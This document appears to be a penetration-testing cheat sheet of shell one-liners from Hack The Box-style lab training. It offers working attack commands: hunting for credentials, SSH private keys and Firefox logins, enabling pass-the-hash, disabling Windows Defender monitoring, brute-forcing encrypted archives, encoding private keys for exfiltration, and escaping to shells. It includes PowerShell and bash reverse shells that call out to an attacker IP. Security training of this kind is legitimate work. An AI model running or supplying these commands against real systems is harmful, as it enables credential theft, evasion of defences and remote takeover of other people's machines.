File Search Commands

#Searching for configuration files in Linux system
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
#Searching for Credentials in Configuration Files
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

#Databases
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

#Finding .txt files & files with no extensions

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

#Finding script files

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

#Finding SSH private keys

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

#Finding SSH public keys

```bash
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

#Bash history
```bash
tail -n5 /home/*/.bash*
```

#Log fils
```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

#Firefox stored credentials
```bash
ls -l .mozilla/firefox/ | grep default

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

#Enable Restricted Admin Mode to Allow PtH
```console
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#Hunting for files
```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

#Hunting for SSH keys
```bash
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

Download All File Extensions
```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

Using a for-loop to Display Extracted Contents
```bash
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

Using bitlocker2john
```bash
muskypirate@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
muskypirate@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
muskypirate@htb[/htb]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
```

Encode (convert) file to base64
```bash
cat id_rsa |base64 -w 0;echo
```

#Disable Antivirus Monitoring in Powershell

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

#Powershell one liner Reverse shell payload (change IP Address & issued in command prompt)
````powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
````

#Bash reverse shell one liner
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

#Spawn the TTY shell session using Python
```bash
python -c 'import pty; pty.spawn("/bin/sh")' 
```

#Using find to shell
```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

find . -exec /bin/sh \; -quit
```

#Using vim to shell
```bash
vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell
```

#Checking plugins' version for wordpress
```bash
 curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

#Checking themes' version for wordpress
```bash
 curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```
